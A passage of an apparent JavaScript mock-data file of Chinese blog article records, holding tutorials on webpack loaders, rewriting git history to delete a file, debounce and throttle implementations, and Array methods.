jsonp data')\")\n})\n\napp.listen('3000', function () {\n    console.log('running......')\n})\n```\n",
      click: 6,
      createdAt: '2020-03-10T10:11:55.000Z',
      updatedAt: '2021-02-16T13:08:06.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 13,
            article_id: 13,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 13,
            user_id: 1,
            article_id: 13,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 10,
          name: 'jsonp',
          color: 'rgba(193, 82, 104, 1)',
          createdAt: '2020-07-04T15:25:55.000Z',
          updatedAt: '2020-07-04T15:25:55.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 5,
      title: 'webpack',
      is_comment: 1,
      status: 1,
      img: '/1583676991439webpack.jpg',
      content:
        '# 常用loader\n\n>安装webpack\n```language\ncnpm install webpack -D\n```\n>安装webpack-cli\n```language\ncnpm install webpack-cli -D\n```\n\n>安装css-loader\n```language\ncnpm install css-loader -D\n```\n\n>安装style-loader\n```language\ncnpm install style-loader -D\n```\n\n>安装less-loader less\n```language\ninstall less-loader less -D\n```\n\n>安装file-loader\n```language\ncnpm install file-loader -D\n```\n\n>安装url-loader\n```language\ncnpm install url-loader -D\n```\n\n>安装babel\n```language\ncnpm install babel-loader @babel/core @babel/preset-env -D\n```',
      click: 5,
      createdAt: '2020-03-08T14:16:32.000Z',
      updatedAt: '2021-02-16T13:05:07.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 5,
            article_id: 5,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 5,
            user_id: 1,
            article_id: 5,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 6,
          name: 'webpack',
          color: 'rgba(142, 214, 251, 1)',
          createdAt: '2020-07-04T15:20:26.000Z',
          updatedAt: '2020-07-04T15:20:26.000Z',
        },
      ],
    },
    {
      id: 19,
      title: 'git永久删除文件和即使记录',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "1，首先在本地删除要删除的文件的相对路径\n```language\ngit filter-branch --force --index-filter 'git rm --cached --ignore-unmatch 要删除文件的相对路径' --prune-empty --tag-name-filter cat -- --all\n```\n2，以强制覆盖的方式更新到远程服务器\n```language\ngit push origin master --force --all\n```\n\n\n",
      click: 3,
      createdAt: '2020-03-07T06:35:45.000Z',
      updatedAt: '2021-02-16T13:09:27.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 19,
            article_id: 19,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 19,
            user_id: 1,
            article_id: 19,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 8,
          name: 'git',
          color: 'rgba(245, 77, 39, 1)',
          createdAt: '2020-07-04T15:22:29.000Z',
          updatedAt: '2020-07-04T15:22:29.000Z',
        },
      ],
    },
    {
      id: 18,
      title: 'js防抖节流',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# 闭包\n\n由于节流和防抖函数的实现都用到了闭包，所以在了解节流和防抖之前先简单介绍下什么是闭包。\n\n```js\nfunction Add() {\n    var x = 1;\n    return function () {\n        x++;\n        console.log(x);\n    }\n}\nvar result = Add();  //第一次执行A函数    \nresult();  //2\nresult();  //3\n```\n\n上述代码：result指向函数Add返回的函数，运行完Add()后，Add的执行环境被释放，但由于函数Add里返回的函数中有对变量x的引用，因此释放时不会释放掉x，每次调用result()时，都保持对x的引用，因此x一直再增加。\n\n\n\n# 防抖\n\n## 定义\n\n- 只有在某个时间内，没有再次触发某个函数时，才真正的调用这个函数；\n\n  我们用一副图来理解一下它的过程；\n\n- 当事件触发时，相应的函数并不会立即触发，而是会等待一定的时间；\n\n- 当事件密集触发时，函数的触发会被频繁的推迟；\n\n- 只有等待了一段时间也没有事件触发，才会真正的执行响应函数；\n\n![debounce.png](https://img.cdn.hsslive.cn/1596914769613debounce.png)\n\n防抖函数\n\n防抖的应用场景很多：\n\n- 输入框中频繁的输入内容，搜索或者提交信息；\n- 频繁的点击按钮，触发某个事件；\n- 监听浏览器滚动事件，完成某些特定操作；\n- 用户缩放浏览器的resize事件；\n\n总之，密集的事件触发，我们只希望触发比较靠后发生的事件，就可以使用防抖函数；\n\n在规定时间内，只让最后一次生效，前面的不生效。\n\n## 最初实现\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n\n    <script>\n        var timer\n        function debounce() {\n            if (timer) {\n                clearTimeout(timer)\n            }\n            timer = setTimeout(function () {\n                ajax()\n            }, 1000);\n        }\n\n        function ajax() {\n            console.log('ajaxajaxajax');\n        }\n        \n        var search = document.querySelector('.search')\n        search.addEventListener('input', debounce)\n        \n    </script>\n</body>\n```\n\n上述代码是最简单的防抖函数，但是会出现如下问题：\n1、对于一个页面上需要多个防抖函数的时候，需要写很多重复代码。不能复用\n2、全局变量污染作用域\n\n因此有以下升级版\n\n## 实现一：优化全局变量污染\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n\n    <script>\n\n        function debounce() {\n            var timer\n            return function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                timer = setTimeout(function () {\n                    ajax()\n                }, 1000);\n            }\n\n        }\n\n        function ajax() {\n            console.log('ajaxajaxajax');\n        }\n\n        var search = document.querySelector('.search')\n        search.addEventListener('input', debounce())\n\n    </script>\n</body>\n```\n\n## 实现二：优化可定义要执行的函数以及防抖时间\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n\n    <script>\n        // 优化可定义要执行的函数以及防抖时间\n        function debounce(fn, delay) {\n            var timer\n            return function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                timer = setTimeout(function () {\n                    fn()\n                }, delay);\n            }\n\n        }\n\n        function ajax(arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments [callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);          // window\n            console.log(arg1, arg2);    // undefined undefined\n        }\n\n        var search = document.querySelector('.search')\n        search.addEventListener('input', debounce(ajax, 500))\n\n    </script>\n</body>\n```\n\n## 实现三：优化this和arguments\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n\n    <script>\n\n        // 优化this和arguments\n        function debounce(fn, delay) {\n            var timer\n            return function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                var _this = this\n                var _arguments = arguments\n                timer = setTimeout(function () {\n                    fn.apply(_this, _arguments)\n                }, delay);\n            }\n\n        }\n\n        function ajax(e, arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments(3) [InputEvent, 100, 200, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);          // <input type=\"text\" class=\"search\">\n        }\n\n        var search = document.querySelector('.search')\n        var debounceWrap = debounce(ajax, 500)\n\n\n        search.addEventListener('input', function () {\n            debounceWrap.apply(this, [event, 100, 200])\n        })\n\n        // 这样也可，但是要注意参数位置变化\n        // Arguments(3) [100, 200, InputEvent, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n        // search.addEventListener('input', debounceWrap.bind(search, 100, 200))\n\n    </script>\n</body>\n```\n\n## 实现四：优化头部立即执行\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n\n    <script>\n        // 优化头部立即执行\n        function debounce(fn, delay, leading) {\n            var timer\n            var leading = leading || false\n            return function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                var _this = this\n                var _arguments = arguments\n                if (leading) {\n                    // 通过一个变量来记录是否立即执行\n                    var isFirst = false\n\n                    // 如果timer是fasle，则立即执行（第一次执行防抖的时候，是undefined，所以第一次一定会执行）\n                    if (!timer) {\n                        fn.apply(_this, _arguments)\n                        isFirst = true\n                    }\n                    // 其余延迟执行\n                    timer = setTimeout(function () {\n\n                        // 立即执行完第一次防抖后，timer就不是fasle了，\n                        // 将timer设为null，这样下一次触发防抖时，立即执行就还会生效\n                        timer = null\n\n                        // 判断在立即执行后，有没有继续触发防抖，有的话才执行，\n                        // 如果只是执行了一次立即执行就结束了，则不执行\n                        if (!isFirst) {\n                            fn.apply(_this, _arguments)\n                        }\n                    }, delay);\n\n                } else {\n                    timer = setTimeout(function () {\n                        fn.apply(_this, _arguments)\n                    }, delay);\n                }\n            }\n\n        }\n\n        function ajax(e, arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments(3) [InputEvent, 100, 200, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);  // <input type=\"text\" class=\"search\">\n        }\n\n        var search = document.querySelector('.search')\n        var debounceWrap = debounce(ajax, 1000, true)\n\n\n\n        search.addEventListener('input', function () {\n            debounceWrap.apply(this, [event, 100, 200])\n        })\n\n        // 这样也可，但是要注意参数位置变化\n        // Arguments(3) [100, 200, InputEvent, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n        // search.addEventListener('input', debounce(ajax, 1000, true).bind(search, 100, 200))\n\n    </script>\n</body>\n```\n\n## 实现五：优化中途取消\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <button class=\"cancel\">取消</button>\n\n    <script>\n        // 优化头部立即执行\n        function debounce(fn, delay, leading) {\n            var timer\n            var leading = leading || false\n            var debounceFn = function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                var _this = this\n                var _arguments = arguments\n\n                if (leading) {\n                    // 通过一个变量来记录是否立即执行\n                    var isFirst = false\n\n                    // 如果timer是fasle，则立即执行（第一次执行防抖的时候，是undefined，所以第一次一定会执行）\n                    if (!timer) {\n                        fn.apply(_this, arguments)\n                        isFirst = true\n                    }\n                    // 其余延迟执行\n                    timer = setTimeout(() => {\n\n                        // 立即执行完第一次防抖后，timer就不是fasle了，\n                        // 将timer设为null，这样下一次触发防抖时，立即执行就还会生效\n                        timer = null\n\n                        // 判断在立即执行后，有没有继续触发防抖，有的话才执行，\n                        // 如果只是执行了一次立即执行就结束了，则不执行\n                        if (!isFirst) {\n                            fn.apply(_this, arguments)\n                        }\n                    }, delay);\n\n                } else {\n                    timer = setTimeout(() => {\n                        fn.apply(_this, arguments)\n                    }, delay);\n                }\n            }\n\n            debounceFn.cancel = function () {\n                clearTimeout(timer)\n                // 清空定时器后，timer还是一个值，会导致下次立即执行失效\n                // 因此清空定时器后，还要将timer设为null\n                // 上面步骤不能乱，要先清空，再重新赋值null\n                timer = null\n            }\n            return debounceFn\n        }\n\n        function ajax(e, arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments(3) [InputEvent, 100, 200, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);  // <input type=\"text\" class=\"search\">\n        }\n\n        var search = document.querySelector('.search')\n        var debounceWrap = debounce(ajax, 1000, true)\n\n\n        // 注意：由于函数拥有自己的作用域，如果将防抖和中途取消分别进行定义，\n        // 则他们指向的不是同一个作用域，会导致中途取消功能取消失效\n        // 如果要使用中途取消功能，则必须要在外部定义一个变量保存防抖函数\n        // 在执行防抖和中途取消时，都得通过外部的全局变量进行操作！\n        search.addEventListener('input', function () {\n            debounceWrap.apply(this, [event, 100, 200])\n        })\n\n        // 这样也可，但是要注意参数位置变化\n        // Arguments(3) [100, 200, InputEvent, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n        // search.addEventListener('input', debounceWrap.bind(search, 100, 200))\n\n        // 这样防抖可以，但是无法进行中途取消，错误写法！\n        // search.addEventListener('input', debounce(ajax, 1000, true).bind(search, 100, 200))\n\n        var cancel = document.querySelector('.cancel')\n\n        cancel.addEventListener('click', function () {\n            debounceWrap.cancel()\n        })\n\n        // 这样取消也可\n        // cancel.addEventListener('click', debounceWrap.cancel)\n\n        // 这样中途取消会执行，但是取消的不是同一个防抖函数，错误写法！\n        // cancel.addEventListener('click', debounce(ajax, 1000, true).cancel)\n\n\n    </script>\n</body>\n```\n\n## 实现六：优化返回值(callback版)\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <button class=\"cancel\">取消</button>\n\n    <script>\n        // 优化返回值\n        function debounce(fn, delay, option) {\n            var timer\n            var option = option || {}\n            var leading = option.leading || false\n            var callback = option.callback || null\n            var result\n            var debounceFn = function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                var _this = this\n                var _arguments = arguments\n                if (leading) {\n                    // 通过一个变量来记录是否立即执行\n                    var isFirst = false\n\n                    // 如果timer是fasle，则立即执行（第一次执行防抖的时候，是undefined，所以第一次一定会执行）\n                    if (!timer) {\n                        result = fn.apply(_this, arguments)\n                        if (callback) {\n                            callback(result)\n                        }\n                        isFirst = true\n                    }\n                    // 其余延迟执行\n                    timer = setTimeout(() => {\n\n                        // 立即执行完第一次防抖后，timer就不是fasle了，\n                        // 将timer设为null，这样下一次触发防抖时，立即执行就还会生效\n                        timer = null\n\n                        // 判断在立即执行后，有没有继续触发防抖，有的话才执行，\n                        // 如果只是执行了一次立即执行就结束了，则不执行\n                        if (!isFirst) {\n                            result = fn.apply(_this, arguments)\n                            if (callback) {\n                                callback(result)\n                            }\n                        }\n                    }, delay);\n\n                } else {\n                    timer = setTimeout(() => {\n                        result = fn.apply(_this, arguments)\n                        if (callback) {\n                            callback(result)\n                        }\n                    }, delay);\n                }\n\n            }\n\n            debounceFn.cancel = function () {\n                clearTimeout(timer)\n                // 清空定时器后，timer还是一个值，会导致下次立即执行失效\n                // 因此清空定时器后，还要将timer设为null\n                // 上面步骤不能乱，要先清空，再重新赋值null\n                timer = null\n            }\n            return debounceFn\n        }\n\n        function ajax(e, arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments(3) [InputEvent, 100, 200, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);  // <input type=\"text\" class=\"search\">\n            return '我是ajax的返回值'\n        }\n\n        var search = document.querySelector('.search')\n        var debounceWrap = debounce(ajax, 1000, {\n            leading: true,\n            callback: function (res) {\n                console.log(res);   // 我是ajax的返回值\n            }\n        })\n\n\n        // 注意：由于函数拥有自己的作用域，如果将防抖和中途取消分别进行定义，\n        // 则他们指向的不是同一个作用域，会导致中途取消功能取消失效\n        // 如果要使用中途取消功能，则必须要在外部定义一个变量保存防抖函数\n        // 在执行防抖和中途取消时，都得通过外部的全局变量进行操作！\n        search.addEventListener('input', function () {\n            debounceWrap.apply(this, [event, 100, 200])\n        })\n\n        var cancel = document.querySelector('.cancel')\n\n        cancel.addEventListener('click', function () {\n            debounceWrap.cancel()\n        })\n    </script>\n</body>\n```\n\n## 实现七：优化返回值(Promise版)\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <button class=\"cancel\">取消</button>\n\n    <script>\n        // 优化返回值\n        function debounce(fn, delay, leading) {\n            var timer\n            var leading = leading || false\n            var debounceFn = function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                var _this = this\n                var _arguments = arguments\n                return new Promise((resolve, reject) => {\n                    if (leading) {\n                        // 通过一个变量来记录是否立即执行\n                        var isFirst = false\n\n                        // 如果timer是fasle，则立即执行（第一次执行防抖的时候，是undefined，所以第一次一定会执行）\n                        if (!timer) {\n                            resolve(fn.apply(_this, _arguments))\n                            isFirst = true\n                        }\n                        // 其余延迟执行\n                        timer = setTimeout(() => {\n\n                            // 立即执行完第一次防抖后，timer就不是fasle了，\n                            // 将timer设为null，这样下一次触发防抖时，立即执行就还会生效\n                            timer = null\n\n                            // 判断在立即执行后，有没有继续触发防抖，有的话才执行，\n                            // 如果只是执行了一次立即执行就结束了，则不执行\n                            if (!isFirst) {\n                                resolve(fn.apply(_this, _arguments))\n                            }\n                        }, delay);\n\n                    } else {\n                        timer = setTimeout(() => {\n                            resolve(fn.apply(_this, _arguments))\n                        }, delay);\n                    }\n                })\n\n            }\n\n            debounceFn.cancel = function () {\n                clearTimeout(timer)\n                // 清空定时器后，timer还是一个值，会导致下次立即执行失效\n                // 因此清空定时器后，还要将timer设为null\n                // 上面步骤不能乱，要先清空，再重新赋值null\n                timer = null\n            }\n            return debounceFn\n        }\n\n        function ajax(e, arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments(3) [InputEvent, 100, 200, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);  // <input type=\"text\" class=\"search\">\n            return 100\n        }\n\n        var search = document.querySelector('.search')\n        var debounceWrap = debounce(ajax, 1000, true)\n\n\n        // 注意：由于函数拥有自己的作用域，如果将防抖和中途取消分别进行定义，\n        // 则他们指向的不是同一个作用域，会导致中途取消功能取消失效\n        // 如果要使用中途取消功能，则必须要在外部定义一个变量保存防抖函数\n        // 在执行防抖和中途取消时，都得通过外部的全局变量进行操作！\n        search.addEventListener('input', function () {\n            debounceWrap.apply(this, [event, 100, 200]).then(res => {\n                console.log(res);\t//100\n            })\n        })\n\n        var cancel = document.querySelector('.cancel')\n\n        cancel.addEventListener('click', function () {\n            debounceWrap.cancel()\n        })\n    </script>\n</body>\n```\n\n# 防抖无注释版\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <button class=\"cancel\">取消</button>\n\n    <script>\n        function debounce(fn, delay, leading) {\n            var timer\n            var leading = leading || false\n            var debounceFn = function () {\n                if (timer) {\n                    clearTimeout(timer)\n                }\n                var _this = this\n                var _arguments = arguments\n                return new Promise((resolve, reject) => {\n                    if (leading) {\n                        var isFirst = false\n                        if (!timer) {\n                            resolve(fn.apply(_this, _arguments))\n                            isFirst = true\n                        }\n                        timer = setTimeout(() => {\n                            timer = null\n                            if (!isFirst) {\n                                resolve(fn.apply(_this, _arguments))\n                            }\n                        }, delay);\n                    } else {\n                        timer = setTimeout(() => {\n                            resolve(fn.apply(_this, _arguments))\n                        }, delay);\n                    }\n                })\n\n            }\n\n            debounceFn.cancel = function () {\n                clearTimeout(timer)\n                timer = null\n            }\n            return debounceFn\n        }\n\n        function ajax(e, arg1, arg2) {\n            console.log('ajaxajaxajax');\n            // Arguments(3) [InputEvent, 100, 200, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n            console.log(arguments);\n            console.log(this);  //<input type=\"text\" class=\"search\">\n            return 100\n        }\n\n        var search = document.querySelector('.search')\n        var debounceWrap = debounce(ajax, 1000, true)\n\n\n        search.addEventListener('input', function () {\n            debounceWrap.apply(this, [event, 100, 200]).then(res => {\n                console.log(res);   //100\n            })\n        })\n\n        var cancel = document.querySelector('.cancel')\n\n        cancel.addEventListener('click', function () {\n            debounceWrap.cancel()\n        })\n\n\n    </script>\n</body>\n```\n\n\n\n# 节流\n\n## 定义\n\n## 最初实现\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <script>\n        function throttle(fn, interval) {\n            var lastTime = 0\n            return function () {\n                var _this = this\n                var _arguments = arguments\n                var newTime = new Date().getTime()\n\n                if (newTime - lastTime > interval) {\n                    fn.apply(_this, _arguments)\n                    lastTime = newTime\n                }\n            }\n        }\n\n        // 获取输入框\n        var search = document.querySelector('.search');\n\n        // 监听事件\n        var counter = 0;\n        function searchFunc(event) {\n            counter++;\n            console.log(\"发送\" + counter + \"次网络请求\");\n            console.log(this);\n        };\n\n        search.addEventListener('input', throttle(searchFunc, 1000))\n\n\n    </script>\n</body>\n```\n\n## 实现一：优化最后一次执行\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <script>\n        function throttle(fn, interval, trailing) {\n            var lastTime = 0\n            var timer\n            var trailing = trailing || false\n            return function () {\n                var _this = this\n                var _arguments = arguments\n                var newTime = new Date().getTime()\n\n                clearTimeout(timer)\n\n                if (newTime - lastTime > interval) {\n                    fn.apply(_this, _arguments)\n                    lastTime = newTime\n                } else if (trailing) {\n                    timer = setTimeout(() => {\n                        fn.apply(_this, _arguments)\n                    }, interval);\n                }\n            }\n        }\n\n        // 获取输入框\n        var search = document.querySelector('.search');\n\n        // 监听事件\n        var counter = 0;\n        function searchFunc(event) {\n            counter++;\n            console.log(\"发送\" + counter + \"次网络请求\");\n            console.log(this);\n        };\n\n        search.addEventListener('input', throttle(searchFunc, 1000, true))\n\n\n    </script>\n</body>\n```\n\n## 实现二：优化返回值(callback版)\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <script>\n        function throttle(fn, interval, option) {\n            var lastTime = 0\n            var timer\n            var option = option || {}\n            var trailing = option.trailing || false\n            var callback = option.callback || null\n            return function () {\n                var _this = this\n                var _arguments = arguments\n                // 获取当前最新的时间戳\n                var newTime = new Date().getTime()\n\n                // 只要触发事件就清除定时器\n                if (timer) {\n                    clearTimeout(timer)\n                }\n\n                var result\n                if (newTime - lastTime > interval) {\n                    result = fn.apply(_this, _arguments)\n                    if (callback) {\n                        callback(result)\n                    }\n\n                    lastTime = newTime\n                } else if (trailing) {\n                    timer = setTimeout(() => {\n                        result = fn.apply(_this, _arguments)\n                        if (callback) {\n                            callback(result)\n                        }\n                    }, interval);\n                }\n            }\n        }\n\n        // 获取输入框\n        var search = document.querySelector('.search');\n\n        // 监听事件\n        var counter = 0;\n        function searchFunc(event) {\n            counter++;\n            console.log(\"发送\" + counter + \"次网络请求\");\n            console.log(this);\n            return 100\n        };\n\n        search.addEventListener('input', throttle(searchFunc, 1000, {\n            trailing: true,\n            callback: function (res) {\n                console.log(res);   // 100\n            }\n        }))\n\n        // var funWrap = throttle(searchFunc, 1000, {\n        //     trailing: true,\n        //     callback: function (res) {\n        //         console.log(res);\n        //         return res\n        //     }\n        // })\n\n        // search.addEventListener('input', function () {\n        //     funWrap.call(this)\n        // })\n\n\n    </script>\n</body>\n```\n\n## 实现三：优化返回值(Promise版)\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <script>\n        function throttle(fn, interval, option) {\n            var lastTime = 0\n            var timer\n            var option = option || {}\n            var trailing = option.trailing || false\n            return function () {\n                var _this = this\n                var _arguments = arguments\n                // 获取当前最新的时间戳\n                var newTime = new Date().getTime()\n\n                // 只要触发事件就清除定时器\n                if (timer) {\n                    clearTimeout(timer)\n                }\n\n                var result\n                return new Promise((resolve, reject) => {\n                    if (newTime - lastTime > interval) {\n                        result = fn.apply(_this, _arguments)\n                        resolve(result)\n\n                        lastTime = newTime\n                    } else if (trailing) {\n                        timer = setTimeout(() => {\n                            result = fn.apply(_this, _arguments)\n                            resolve(result)\n                        }, interval);\n                    }\n                })\n            }\n        }\n\n        // 获取输入框\n        var search = document.querySelector('.search');\n\n        // 监听事件\n        var counter = 0;\n        function searchFunc(event) {\n            counter++;\n            console.log(\"发送\" + counter + \"次网络请求\");\n            console.log(this);\n            return 100\n        };\n\n        // search.addEventListener('input', throttle(searchFunc, 1000, {\n        //     trailing: true,\n        // }))\n\n        var funWrap = throttle(searchFunc, 1000, {\n            trailing: true,\n        })\n\n        search.addEventListener('input', function () {\n            funWrap.call(this).then(res => {\n                console.log(res);\n            })\n        })\n\n    </script>\n</body>\n```\n\n## 节流无注释版\n\n```html\n<body>\n    <input type=\"text\" class=\"search\">\n    <script>\n        function throttle(fn, interval, option) {\n            var lastTime = 0\n            var timer\n            var option = option || {}\n            var trailing = option.trailing || false\n            return function () {\n                var _this = this\n                var _arguments = arguments\n                var newTime = new Date().getTime()\n\n                if (timer) {\n                    clearTimeout(timer)\n                }\n\n                var result\n                return new Promise((resolve, reject) => {\n                    if (newTime - lastTime > interval) {\n                        result = fn.apply(_this, _arguments)\n                        resolve(result)\n\n                        lastTime = newTime\n                    } else if (trailing) {\n                        timer = setTimeout(() => {\n                            result = fn.apply(_this, _arguments)\n                            resolve(result)\n                        }, interval);\n                    }\n                })\n            }\n        }\n\n        // 获取输入框\n        var search = document.querySelector('.search');\n\n        // 监听事件\n        var counter = 0;\n        function searchFunc(event) {\n            counter++;\n            console.log(\"发送\" + counter + \"次网络请求\");\n            console.log(this);\n            return 100\n        };\n\n        // search.addEventListener('input', throttle(searchFunc, 1000, {\n        //     trailing: true,\n        // }))\n\n        var funWrap = throttle(searchFunc, 1000, {\n            trailing: true,\n        })\n\n        search.addEventListener('input', function () {\n            funWrap.call(this).then(res => {\n                console.log(res);\n            })\n        })\n\n\n    </script>\n</body>\n```\n\n",
      click: 59,
      createdAt: '2020-03-07T06:12:52.000Z',
      updatedAt: '2021-02-16T13:09:19.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 18,
            article_id: 18,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 18,
            user_id: 1,
            article_id: 18,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 15,
          name: '性能优化',
          color: 'rgba(140, 72, 193, 0.57)',
          createdAt: '2020-07-15T19:41:04.000Z',
          updatedAt: '2020-07-15T19:41:04.000Z',
        },
      ],
    },
    {
      id: 12,
      title: 'Js Array对象',
      is_comment: 1,
      status: 1,
      img: '/1582618699043array.jpg',
      content:
        '# Array对象\n\n## 常用方法\n\n### 在数组末尾添加一个或多个元素 - push()\n\n> 在数组末尾添加一个或多个元素，返回新长度，会修改原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nvar len1 = arr.push(6)\nconsole.log(arr);   //[1, 2, 3, 4, 5, 6]\nconsole.log(len1);  //6\n```\n\n### 在数组开头添加一个或多个元素 - unshift()\n\n> 在数组开头添加一个或多个元素，返回新长度，会修改原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nvar len2 = arr.unshift(0)\nconsole.log(arr);   //[0, 1, 2, 3, 4, 5]\nconsole.log(len2);  //6\n```\n\n### 删除数组的最后一个元素 - pop()\n\n> pop() 方法用于删除数组的最后一个元素，并返回删除的元素，会修改原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nvar reitem = arr.pop()\nconsole.log(arr);   //[1, 2, 3, 4]\nconsole.log(reitem);  //5\n```\n\n### 把数组的第一个元素从其中删除 - shift()\n\n> shift() 方法用于把数组的第一个元素从其中删除，并返回第一个元素的值，会修改原数组\n\n```js\nvar arr = [1, 2, 3, 4, 5]\nvar reitem1 = arr.shift()\nconsole.log(arr);   //[2, 3, 4, 5]\nconsole.log(reitem1);   //1\n```\n\n### 添加或删除数组中的元素 - splice()\n\n> arr.splice(\'添加/删除的起始位置(必须)\',\'删除的数量(可选)\',\'要添加的元素(可选)\')\n\nsplice() 方法用于添加或删除数组中的元素，会修改原数组\n\n如果从 arrayObject 中删除了元素，则返回的是含有被删除的元素的数组。\n\n```js\n<script>\n    var arr = [\'aaa\', \'bbb\', \'ccc\', \'ddd\']\n    // 在数组下标为1的位置，删除后面的全部元素\n    // var res = arr.splice(1)\n    // console.log(res);   //["bbb", "ccc", "ddd"]\n    // console.log(arr);   //["aaa"]\n\n    // 在数组下标为2的位置，删除后面的全部元素\n    // var res = arr.splice(2)\n    // console.log(res);   //["ccc", "ddd"]\n    // console.log(arr);   //["aaa", "bbb"]\n\n    // 在数组下标为1的位置，删除后面的全部元素\n    // var res1 = arr.splice(1, 0)\n    // console.log(res1);  //[]\n    // console.log(arr);   //["aaa", "bbb", "ccc", "ddd"]\n\n    // 在数组下标为1的位置，删除一个元素\n    // var res1 = arr.splice(1, 1)\n    // console.log(res1);  //["bbb"]\n    // console.log(arr);   //["aaa", "ccc", "ddd"]\n\n    // 在数组下标为1的位置，删除两个元素\n    // var res1 = arr.splice(1, 2)\n    // console.log(res1);  